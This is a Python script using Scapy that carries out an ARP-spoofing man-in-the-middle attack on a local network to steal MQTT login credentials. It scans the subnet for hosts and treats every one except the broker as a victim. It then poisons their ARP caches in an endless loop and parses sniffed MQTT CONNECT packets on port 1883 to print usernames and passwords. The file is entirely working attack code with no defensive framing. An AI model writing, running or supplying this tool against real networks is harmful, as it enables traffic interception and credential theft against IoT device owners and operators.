#!/usr/bin/env python3
# Filename: mqtt_mitm_sniffer.py

from scapy.all import sniff, ARP, Ether, Raw, TCP, send, arping
import struct
import threading
import time
import ipaddress
import socket
import os

# ───────────────────────────────────────────────────────────────
# CONFIGURATION
BROKER_IP = "192.168.10.1"
INTERFACE = "eth0"

# ───────────────────────────────────────────────────────────────
# NETWORK UTILITIES

def get_subnet():
    ip = socket.gethostbyname(socket.gethostname())
    try:
        ip = socket.gethostbyname(socket.getfqdn())
    except:
        pass
    ip_parts = ip.split('.')
    ip_parts[-1] = '0'
    return '.'.join(ip_parts) + '/24'

def discover_devices(subnet):
    print("[*] Discovering live devices via ARP scan...")
    answered, _ = arping(subnet, iface=INTERFACE, timeout=2, verbose=False)
    devices = {rcv.psrc: rcv.hwsrc for _, rcv in answered}
    return devices

# ───────────────────────────────────────────────────────────────
# ARP SPOOFING

def start_arp_spoofing(broker_ip, broker_mac, victims):
    print("[*] Starting ARP spoof loop...")

    def spoof():
        while True:
            for vip, vmac in victims.items():
                send(ARP(op=2, pdst=vip, psrc=broker_ip, hwdst=vmac), verbose=False)
                send(ARP(op=2, pdst=broker_ip, psrc=vip, hwdst=broker_mac), verbose=False)
            time.sleep(2)

    thread = threading.Thread(target=spoof, daemon=True)
    thread.start()

# ───────────────────────────────────────────────────────────────
# MQTT CREDENTIAL EXTRACTION

def extract_credentials(pkt):
    if Raw in pkt and pkt[TCP].dport == 1883:
        payload = pkt[Raw].load
        if payload[0] == 0x10:  # CONNECT packet
            try:
                i = 2
                proto_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + proto_len + 4

                client_id_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2 + client_id_len

                username_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                username = payload[i:i+username_len].decode(errors="ignore")
                i += username_len

                password_len = struct.unpack(">H", payload[i:i+2])[0]
                i += 2
                password = payload[i:i+password_len].decode(errors="ignore")

                print(f"[+] MQTT Credentials → Username: '{username}' | Password: '{password}'")
            except:
                pass

def sniff_credentials():
    print("[*] Sniffing MQTT credentials on port 1883…")
    sniff(iface=INTERFACE, filter="tcp port 1883", prn=extract_credentials, store=0)

# ───────────────────────────────────────────────────────────────
# MAIN LOGIC

if __name__ == "__main__":
    print(f"[*] Broker: {BROKER_IP}")
    subnet = get_subnet()
    print(f"[*] Subnet: {subnet}")

    devices = discover_devices(subnet)
    if not devices:
        print("[-] No devices found.")
        exit(1)

    victims = {ip: mac for ip, mac in devices.items() if ip != BROKER_IP}
    broker_mac = devices.get(BROKER_IP, None)

    print("[+] Victims:")
    for v in victims:
        print(f"    {v} → {victims[v]}")
    print(f"[+] Broker MAC: {broker_mac}")

    if not broker_mac:
        print("[-] Could not resolve broker MAC. Exiting.")
        exit(1)

    start_arp_spoofing(BROKER_IP, broker_mac, victims)
    sniff_credentials()

